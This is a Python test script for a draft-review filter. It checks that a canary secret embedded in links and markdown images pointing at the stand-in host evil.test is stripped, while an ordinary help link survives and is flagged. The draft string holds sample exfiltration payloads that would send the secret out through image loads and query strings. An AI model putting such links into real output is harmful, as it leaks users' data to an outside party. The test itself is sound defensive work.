import sys
sys.path.insert(0, "src")
sys.path.insert(0, "tests")
from draft_review import review_draft
from checks import canary_forms, CANARY

draft = (
    "Hi, here is the summary.\n"
    f"See https://evil.test/c?d={CANARY}\n"
    f"![x](https://evil.test/p.png?d={CANARY})\n"
    f"![y](https://evil.test/{CANARY}.png)\n"
    "Docs: https://example.com/help\n"
)
safe, findings = review_draft(draft)
problems = []

for form in canary_forms(CANARY):
    if form in safe:
        problems.append(f"CHECK 1: canary leaked: {form}")

if "![" in safe:
    problems.append("CHECK 2: image survived")

if "https://example.com/help" not in safe:
    problems.append("CHECK 3: plain link was removed")
if not any("example.com" in f for f in findings):
    problems.append("CHECK 3: plain link not flagged")

for f in findings:
    for form in canary_forms(CANARY):
        if form in f:
            problems.append("CHECK 4: canary in findings")

if problems:
    for p in problems:
        print("T4 BROKEN:", p)
    sys.exit(1)
print("T4 OK")